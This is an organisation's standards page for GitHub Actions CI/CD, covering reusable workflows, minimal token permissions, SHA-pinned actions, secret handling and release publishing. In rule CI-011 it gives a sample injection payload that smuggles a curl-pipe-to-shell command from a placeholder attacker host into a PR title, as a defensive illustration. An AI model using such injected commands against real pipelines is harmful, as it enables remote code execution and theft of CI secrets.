# CI/CD with GitHub Actions

## TL;DR

- Every repository runs CI on GitHub Actions with GitHub-hosted runners. No server, no self-hosted runner.
- Projects **call the reusable workflows of this repository**, pinned to a release (`@v1`). They do not copy CI logic.
- Every workflow uses **minimal permissions**, actions **pinned by commit SHA**, `concurrency`, `timeout-minutes` and caching.
- Secrets are never exposed to pull requests from forks. `pull_request_target` is not used to run PR code.
- "Deployment" means **publishing artifacts**: container images on GHCR, packages on PyPI, models and datasets on Hugging Face Hub, documentation on GitHub Pages.

## Reusable workflows

| Workflow | What it does | Level |
|---|---|---|
| [`pre-commit.yml`](../../.github/workflows/pre-commit.yml) | Runs every pre-commit hook on all files | 1 |
| [`python-ci.yml`](../../.github/workflows/python-ci.yml) | uv (cached) → `ruff check` → `ruff format --check` → mypy → import-linter (optional) → pytest with coverage → coverage artifact | 1 (lint, tests), 2 (mypy, coverage) |
| [`node-ci.yml`](../../.github/workflows/node-ci.yml) | pnpm (cached) → lint → format check → typecheck → tests → build → coverage artifact | 1 |
| [`pr-conventions.yml`](../../.github/workflows/pr-conventions.yml) | PR title (Conventional Commits, length) and branch name | 1 |
| [`security.yml`](../../.github/workflows/security.yml) | Dependency review on PRs, gitleaks on the history, optional pip-audit and pnpm audit | 1 (secrets), 2 (others) |

Planned for the next version of these standards: `sonar.yml` (SonarQube Cloud analysis with the coverage artifacts), `docker.yml` (hadolint, build, push to GHCR on release) and `release-please.yml`.

Each workflow documents its inputs at the top of the file. The caller template is [`templates/github/workflows/ci.yml`](../../templates/github/workflows/ci.yml). It is tested in this repository by [`example-integration.yml`](../../.github/workflows/example-integration.yml), which calls the workflows on the fixtures in `tests/fixtures/`.

### Example: a full-stack repository

```yaml
name: CI
on:
  pull_request:
    types: [opened, edited, synchronize, reopened, ready_for_review]
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
jobs:
  conventions:
    uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/pr-conventions.yml@v1
    permissions:
      contents: read
      pull-requests: read
  pre-commit:
    uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/pre-commit.yml@v1
    with:
      skip: no-commit-to-branch,prettier
  backend:
    uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/python-ci.yml@v1
    with:
      working-directory: backend
      coverage-fail-under: 62
  frontend:
    uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/node-ci.yml@v1
    with:
      working-directory: frontend
  security:
    uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/security.yml@v1
```

The `edited` event type runs the checks again when somebody changes the PR title.

## Rules

### CI-001: Every repository has a CI workflow on pull requests and on `main`

**MUST** · Level 1 · Verified by: `.github/workflows/` review (manual); required checks in the ruleset (automatic)

### CI-002: Projects call the DAH Labs reusable workflows, pinned to a release

**MUST** · Level 1 · Verified by: workflow review (manual)

- ✅ `uses: DAH-Projects-and-Innovations/engineering-standards/.github/workflows/python-ci.yml@v1`
- ✅ `uses: …/python-ci.yml@<full-commit-sha> # v1.0.0` (strongest pinning, Level 3)
- ❌ `uses: …/python-ci.yml@main` (any change to this repository changes your CI without notice)

`@v1` is a moving tag that follows the latest `1.x.y` release; it never contains breaking changes. A breaking change in a reusable workflow creates `v2`.

A project MAY add its own jobs next to the reusable ones (for example integration tests with Postgres and Redis services, see [PY-025](python.md#py-025-integration-tests-that-need-services-run-in-their-own-ci-job)).

**Why:** one fix in this repository improves every project. See [ADR 0009](../adr/0009-central-reusable-workflows.md).

**Access:** reusable workflows in a public repository can be called by any repository. GitHub does **not** allow a public repository to call a reusable workflow stored in a private repository ([GitHub Docs](https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#access-to-reusable-workflows)). This is why this repository is public.

### CI-003: CI runs lint and tests (Level 1), plus type check and coverage (Level 2)

**MUST** · Level 1 · Verified by: required checks (automatic)

### CI-004: Workflows use minimal permissions

**MUST** · Level 1 · Verified by: workflow review (manual); OpenSSF Scorecard "Token-Permissions" (automatic, Level 3)

- Top level: `permissions: contents: read`.
- Each job asks only for what it needs, for example `pull-requests: read`.
- The organization setting "Workflow permissions" is **Read repository contents** (see [GitHub settings](github-settings.md)).

```yaml
# ✅
permissions:
  contents: read

# ❌ (every job can push code, create releases and change issues)
permissions: write-all
```

### CI-005: Actions are pinned by full commit SHA, with the version in a comment

**MUST** · Level 1 · Verified by: workflow review (manual); OpenSSF Scorecard "Pinned-Dependencies" (automatic, Level 3)

```yaml
# ✅
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

# ❌ (a tag can be moved to malicious code by whoever controls the action)
- uses: actions/checkout@v7
```

Dependabot (`package-ecosystem: github-actions`) understands this format and updates the SHA and the comment together. To find the SHA of a tag: `gh api repos/actions/checkout/commits/v7.0.1 --jq .sha`.

This rule applies to every action, including `actions/*`. Reusable workflows of this repository are the only exception (CI-002).

### CI-006: Workflows cancel outdated runs

**MUST** · Level 1 · Verified by: workflow review (manual)

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

Put `concurrency` in the **caller** workflow only. If the caller and a reusable workflow use the same group name, the reusable workflow cancels itself.

**Why:** when you push three commits in a row, only the last one needs CI. This saves minutes and gives faster feedback.

### CI-007: Every job has `timeout-minutes`

**MUST** · Level 1 · Verified by: workflow review (manual)

The default timeout of GitHub is 6 hours. A stuck job then consumes 6 hours of minutes. The reusable workflows have a `timeout-minutes` input (default 20 minutes or less).

### CI-008: Dependencies are cached

**SHOULD** · Level 1 · Verified by: workflow review (manual)

`astral-sh/setup-uv` with `enable-cache: true` and `actions/setup-node` with `cache: pnpm` restore dependencies in seconds. The reusable workflows already do this.

### CI-009: Pull requests from forks never get secrets

**MUST NOT** · Level 1 · Verified by: workflow review (manual)

- Use `on: pull_request`. GitHub runs fork PRs with a **read-only** token and **without secrets**.
- Do not use `on: pull_request_target` to build, test or run code from the PR. `pull_request_target` runs in the context of the base repository, **with secrets and a write token**. If the workflow checks out the PR code and runs it (`pip install`, `pnpm install`, tests), an attacker can steal the secrets with a malicious PR.
- Keep the organization setting "Require approval for first-time contributors" for fork PR workflows.

**Consequence:** jobs that need a secret (for example SonarQube Cloud with `SONAR_TOKEN`) are skipped on fork PRs. They run again after the merge on `main`. Maintainers can also push the branch to the main repository to get the full analysis.

### CI-010: Secrets are stored in GitHub, at the organization level when shared

**MUST** · Level 1 · Verified by: settings audit (manual); secret scanning (automatic)

- Shared secrets (`SONAR_TOKEN`) are **organization secrets** with access limited to the repositories that need them.
- Project-specific secrets are repository secrets or **environment** secrets (for a deployment environment that requires approval).
- `actions/checkout` uses `persist-credentials: false`, so the token is not left in `.git/config` for later steps.
- Never print a secret. GitHub masks known secrets in logs, but not values derived from them.

### CI-011: Untrusted input is never written directly in a `run:` script

**MUST** · Level 1 · Verified by: workflow review (manual); actionlint (automatic, partly)

PR titles, branch names, issue bodies and commit messages are controlled by the author. Pass them through an environment variable:

```yaml
# ✅
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"

# ❌ a title like  a"; curl https://evil.example/x | sh; echo "  runs that command
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

### CI-012: Workflows are linted by actionlint

**SHOULD** · Level 1 · Verified by: `actionlint` pre-commit hook (automatic)

```yaml
- repo: https://github.com/rhysd/actionlint
  rev: v1.7.12
  hooks:
    - id: actionlint
```

The hook installs actionlint with Go (pre-commit downloads Go if needed). actionlint also runs shellcheck on `run:` scripts when shellcheck is installed.

### CI-013: Artifacts are published only from a release, with short-lived credentials

**SHOULD** · Level 2 · Verified by: workflow review (manual)

See [Continuous delivery without infrastructure](#continuous-delivery-without-infrastructure).

### CI-014: Pull request feedback takes less than 10 minutes

**SHOULD** · Level 2 · Verified by: Actions run durations (manual)

Run jobs in parallel, cache dependencies, and move slow tests (`slow`, `integration`) to separate jobs. A contributor on a slow connection should not wait 30 minutes to learn that a test failed.

## Continuous delivery without infrastructure

DAH Labs has no servers. "Deployment" means publishing a versioned artifact that others can use. Publish **only** when a release is created (a `vX.Y.Z` tag made by release-please), never on every push.

| Artifact | Where | How to authenticate | Notes |
|---|---|---|---|
| Container image | **GitHub Container Registry** (`ghcr.io/dah-projects-and-innovations/<image>`) | `GITHUB_TOKEN` with `packages: write`, in the release job only | Free for public images. Tag `X.Y.Z` and `latest`. The `docker.yml` reusable workflow is planned. |
| Python package | **PyPI** | [Trusted Publishing](https://docs.pypi.org/trusted-publishers/) (OIDC): no token stored in GitHub | `pypa/gh-action-pypi-publish`, `permissions: id-token: write`, in a protected `pypi` environment |
| Model or dataset | **Hugging Face Hub**, organization account | `HF_TOKEN` (fine-grained, write access to the organization repositories only) stored as an environment secret | Upload with `huggingface_hub`; tag the Hub revision with the Git version |
| Documentation | **GitHub Pages** | `actions/deploy-pages` with `pages: write` and `id-token: write` | Free for public repositories |

## GitHub Actions quotas

Checked on 2026-11-13 in the [GitHub Actions billing documentation](https://docs.github.com/en/billing/concepts/product-billing/github-actions):

| Repository | Standard GitHub-hosted runners | Artifact storage | Cache |
|---|---|---|---|
| **Public** | **Free, no minute limit** | Free | 10 GB per repository |
| **Private**, organization on GitHub Free | $12 of included compute per month for the whole organization (about 2 000 minutes on a standard Linux runner, at $0.006 per minute) | 500 MB, shared with GitHub Packages | 10 GB per repository |

GitHub now expresses the included usage as an amount of money, not as minutes. macOS and Windows runners cost more than Linux runners, so DAH Labs workflows use `ubuntu-latest`.

> ⚠️ To verify regularly: GitHub changed Actions pricing several times in 2026. Check the billing page above before you plan heavy CI on a private repository.

## Checklist

- [ ] `.github/workflows/ci.yml` calls the reusable workflows with `@v1` (or a SHA).
- [ ] The caller sets `permissions: contents: read` at the top and `concurrency` with cancellation for PRs.
- [ ] Every action is pinned by full commit SHA with a version comment.
- [ ] Every job has `timeout-minutes`.
- [ ] No workflow uses `pull_request_target` to run PR code.
- [ ] No `${{ github.event.* }}` value is written directly inside `run:`.
- [ ] Shared secrets are organization secrets with selected repositories.
- [ ] Publishing jobs run only on releases and use Trusted Publishing or `GITHUB_TOKEN`.

---

*Last verified: 2026-11-13.*
